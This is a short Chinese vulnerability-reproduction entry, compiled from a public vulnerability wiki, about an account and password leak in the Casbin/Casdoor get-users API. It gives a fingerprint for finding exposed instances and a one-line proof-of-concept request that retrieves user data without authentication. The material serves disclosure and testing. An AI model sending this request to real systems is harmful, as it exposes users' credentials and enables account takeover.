---
title: "Casbin get-users 账号密码泄漏漏洞"
date: 2026-10-16 09:07:11
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "Casbin-get-users"
tags:
  - "Casbin-get-users"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

Casbin get-users api接口存在账号密码泄漏漏洞，攻击者通过漏洞可以获取用户敏感信息

## 漏洞影响

```
Casbin
```

## 网络测绘

```
title="Casdoor"
```

## 漏洞复现

登录页面

![image-20220524143206718](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205241432780.png)

验证POC

```
/api/get-users?p=123&pageSize=123
```

![image-20220524143215583](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205241432624.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/Casbin-get-users-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md)
